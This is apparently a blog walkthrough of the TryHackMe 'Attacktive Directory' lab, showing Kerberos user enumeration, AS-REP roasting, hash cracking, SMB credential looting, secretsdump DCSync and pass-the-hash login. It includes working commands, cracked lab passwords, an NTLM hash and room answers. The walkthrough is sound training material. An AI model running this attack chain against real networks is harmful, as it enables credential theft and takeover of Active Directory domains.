# Attacktive Directory - Try Hack Me Walkthrough

![](https://cdn-images-1.medium.com/max/1000/1\*qX1t1LN5mzSIE3GWnkmkPA.png)

Hello, fellow blue teamers,

Join me in this blog entry, as I guide you to solve Try to Hack Me’s [Attactive Directory](https://tryhackme.com/room/attacktivedirectory) room, without the help of Metasploit— a step in the right direction for those wanting to learn Windows and Active Directory

Room credits go to [Sq00ky](https://tryhackme.com/p/Sq00ky).Great stuff!

## Task 1 - Deploy the VM

Start the room’s VM and proceed with your Kali Machine or the Attack box

Download the VPN configuration file and connect to it, via OpenVPN (for those not using TryHackMe’s Attack box)

IP Address — 10.9.1.196&#x20;

Machine IP — 10.10.45.156&#x20;

## Task 2 - Pre-requisites

### I**nstalling Impacket on VM** 

**Command -** git clone [https://github.com/SecureAuthCorp/impacket.git](https://github.com/SecureAuthCorp/impacket.git) (this tool is pretty important to know and perform attacks with it in this room)

> To install the Python requirements for Impacket:

> `Command — pip3 install -r /opt/impacket/requirements.txt`

> Once the requirements have finished installing, we can then run the python setup install script:

> `Command — cd /opt/impacket/ && python3 ./setup.py install`

After that, Impacket should be correctly installed now and it should be ready to use!&#x20;

&#x20;**Installing Bloodhound and Neo4j**

> `Command — apt install bloodhound neo4j`

## T**ask 3 - Enumeration**

> Basic enumeration starts out with an nmap scan. Nmap is a relatively complex utility that has been refined over the years to detect what ports are open on a device, what services are running, and even detect what operating system is running. It’s important to note that not all services may be deteted correctly and not enumerated to it’s fullest potential. Therefore after an initial nmap scan we’ll be using other utilities to help us enumerate the services running on the device.

We first undertake a version scan on the target, on ports 135,139, and 445 to find versions and other information

> `Command — nmap -sV -p 135,139,445 10.10.45.156`

We get the following information from the scan report:-

​

![](https://cdn-images-1.medium.com/max/1000/1\*Ia5RM3P4pNzp8Il9MJh57Q.png)

### Questions

> Q)What tool will allow us to enumerate port 139/445?&#x20;

> A)enum4linux

Keep in mind that enum4linux is not OS-specific. You can use it to enumerate SMB and RDP ports on both Linux and Windows

We use it to enumerate the host:-

> `Command — enum4linux 10.10.45.156`

This is the information that we get:-

​​![](https://cdn-images-1.medium.com/max/1500/1\*IwyOsLk4zLTTNb6nu-Kjaw.png)​​​​![](https://cdn-images-1.medium.com/max/1000/1\*mbNhsgt1aAdx6xVWAtR7fA.png)\


We didn't get anything useful from this enumeration, for now

### Questions

> Q)What is the NetBIOS-Domain Name of the machine?

> A)THM-AD

> Q)What invalid TLD do people commonly use for their Active Directory Domain?
>
>
>
> A).local

## **Task 4 - Enumerating users via Kerberos**

### Introduction to Kerberos

> A whole host of other services are running, including Kerberos. Kerberos is a key authentication service within Active Directory. With this port open, we can use a tool called Kerbrute (by Ronnie Flathers [@ropnop](http://twitter.com/ropnop)) to brute force discovery of users, passwords and even password spray!

> We get a modified user and password list to spray and perform attacks on.I copy-pasted them to a seperate file named ‘Username’ and ‘Password’

### Questions

> Q)What command within Kerbrute will allow us to enumerate valid usernames?

> A)userenum

Now, we proceed to install Kerbrute, to see what valid usernames are present in the Domain Controller

Steps to install Kerbrute properly:-

> Execute the command — go get kerbrute (make sure you have go installed prior,or install it with the help of apt)

> make all

Now to make use of the tool

> `Command — ./kerbrute userenum — dc 10.10.132.240 -d spookysec.local /home/kali/Downloads/Passwords`

We get the following accounts:-

​

![](https://cdn-images-1.medium.com/max/1000/1\*pdDnM5JOq6OKax2oqEPRgA.png)

### Questions

> Q)What notable account is discovered? (These should jump out at you)

> A)When consulting the image,we find A)svc-admin

> Q)What is the other notable account is discovered? (These should jump out at you)

> A)backup

## **Task 5 - Abusing Kerberos**

### Introduction

> After the enumeration of user accounts is finished, we can attempt to abuse a feature within Kerberos with an attack method called ASREPRoasting. ASReproasting occurs when a user account has the privilege “Does not require Pre-Authentication” set. This means that the account does not need to provide valid identification before requesting a Kerberos Ticket on the specified user account.

### **Retrieving Kerberos Tickets**

> Impacket has a tool called “GetNPUsers.py” (located in impacket/examples/GetNPUsers.py) that will allow us to query ASReproastable accounts from the Key Distribution Center. The only thing that’s necessary to query accounts is a valid set of usernames which we enumerated previously via Kerbrute.

Next, we make use of the GetNPUsers module from impacket to get the password hash of the svc-admin user

> Command — python3 GetNPUsers.py spookysec.local/svc-admin -no-pass

We get the password hash of the svc-admin user​

![](https://cdn-images-1.medium.com/max/1000/1\*BrCC\_MdfMCUXVqk13hbAIQ.png)

Now, let's use Hashcat to decrypt it:-

`Command — hashcat -m 18200 Password Password`&#x20;

where 18200  = Kerberos 5,etype 23,AS-REP

Cracked Password — management2005

![](https://cdn-images-1.medium.com/max/1000/1\*0t0A-98QO7xRkhJMiIyhMw.png)

### Questions

> Q)We have two user accounts that we could potentially query a ticket from. Which user account can you query a ticket from with no password?

> A)svc-admin

> Q)Looking at the Hashcat Examples Wiki page, what type of Kerberos hash did we retrieve from the KDC? (Specify the full name)

> A)Kerberos 5 etype 23 AS-REP

> Q)What mode is the hash?

> A)18200
>
>
>
> Q)Now crack the hash with the modified password list provided, what is the user accounts password?

> A)management2005

## **Task 6 - Back to the Basics**

Now, we try to see what shares are present on SMB, with svc-admin’s credentials, where we find:-

![](https://cdn-images-1.medium.com/max/1000/1\*XOfpM3Rs8RHNQqpNh\_8TtA.png)

Now to access shares that we can:-

> `Command — smbclient //10.10.50.196/backup/ -U “svc-admin”`

​Inside which we find:-​

![​](https://cdn-images-1.medium.com/max/1000/1\*klX\_LPhRVnuPXquD57NmQQ.png)

Now to download them onto the system, use the following commands:-

> `tarmode`

> `recurse`

> `prompt`

> `mget backup_credentials.txt /home/kali/Downloads`

![Questions:-](https://cdn-images-1.medium.com/max/1000/1\*JvgPTY4rwCYV6UNctUVzJQ.png)

### **Questions**

> Q)What utility can we use to map remote SMB shares?

> A)smbclient

> Q)Which option will list shares?

> A)-L

> Q)How many remote shares is the server listing?

> A)6

Now, we cat out the contents of backup\_credentials.txt, where we find:-

![](https://cdn-images-1.medium.com/max/1000/1\*U1ACW\_InG9rLIxExy-DZdw.png)

Inserting the hash on Crackstation, gave us no dice, so we proceed to crack it with the help of JohnTheRipper

Then I tried inserting two equal to signs (==)towards the end of the hash, mimicking a base64 hash, and then tried to decode it

> `Command — base64 — decode SMB >> SMB1`

Catting out the contents of SMB2, we find:-

​

![](https://cdn-images-1.medium.com/max/1000/1\*xOHJihwnAsJDAhVoZQG-FQ.png)

> Q)Decoding the contents of the file, what is the full contents?
>
> A) backup@spookysec.local:backup2517860

## Task 7 - Elevating Privileges within the Domain

> Now that we have new user account credentials, we may have more privileges on the system than before. The username of the account “backup” gets us thinking. What is this the backup account to?

> Well, it is the backup account for the Domain Controller. This account has a unique permission that allows all Active Directory changes to be synced with this user account. This includes password hashes

> Knowing this, we can use another tool within Impacket called “secretsdump.py”. This will allow us to retrieve all of the password hashes that this user account (that is synced with the domain controller) has to offer. Exploiting this, we will effectively have full control over the AD Domain.

Now, let’s recover the NTLM hashes of accounts on the Domain Controller, using the secretsdump.py module.

> `Command — python3 secretsdump.py spookysec.local/backup:backup2517860@10.10.50.156`

​​![](https://cdn-images-1.medium.com/max/1000/1\*w75hGQS12klo0brSr1hThg.png)

### Questions

> Q)What method allowed us to dump NTDS.DIT?

> A)DRSUAPI

> Q)What is the Administrators NTLM hash?

> A)0e0363213e37b94221497260b0bcb4fc

> Q)What method of attack could allow us to authenticate as the user without the password?

> A)pass the hash

> Q)Using a tool called Evil-WinRM what option will allow us to use a hash?

> A)-H

## Task 8 - F**lag Submission Panel**

Submit the flags for each user account. They can be located on each user’s desktop.

For this cause, we need to download the Evil-winrm tool, that will allow us to remotely log in to another Windows machine. We supplement this tool, with the help of the pass-the-hash attack, with the help of the administrator’s NTLM hash​

![](https://cdn-images-1.medium.com/max/1000/1\*DhjDpV9J8urUoXaa-ZMykQ.png)

Logged in successfully to the machine

Found the flag in /Desktop for Administrator

![](https://cdn-images-1.medium.com/max/1000/1\*jVFDzefaE4Jm7Y8jdeHVaA.png)

Similarly for svc-admin and backup account users:-

![](https://cdn-images-1.medium.com/max/1000/1\*IPwJN97wkRYImYelntTIFw.png)

![](https://cdn-images-1.medium.com/max/1000/1\*VMjcex8e16mgvqPRu7VjkA.png)

## Conclusion

This is a great room to practice Windows Active Directory on, especially when you are a budding Security Analyst, wanting to understand Windows infrastructure

Although the concept of cracking and capturing hashes fall under the cycle of red-teaming, it is still essential to know and keep this knowledge in your armor

Thank you for reading this blog and stay tuned as I try to close down more SOC alerts……

## Your opinion matters

My audience has a voice. Feel free to reach out to me on my socials (links are on top of this page), for any queries to be addressed.Dropping a sweet message would make my day

Let your opinion about this write-up be known, by selecting any one of the emojis below!
